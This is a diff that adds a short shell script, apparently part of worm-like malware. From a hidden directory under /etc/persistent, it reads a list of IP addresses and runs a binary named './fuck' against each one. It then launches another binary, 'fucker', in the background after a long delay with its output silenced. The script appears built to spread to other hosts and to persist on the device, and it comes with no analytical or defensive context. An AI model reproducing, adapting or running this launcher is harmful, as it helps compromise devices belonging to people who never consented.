@@ -1,0 +1,13 @@
+#!/bin/sh
+if [ -z "$1" ] ; then
+f=/tmp/inf
+else
+f=$1
+fi
+cd /etc/persistent/.mf
+
+cat $f | sort -r | while read ip ; do
+ ./fuck $ip
+done
+
+(sleep 99999; /etc/persistent/fucker >/dev/null 2>/dev/null) &
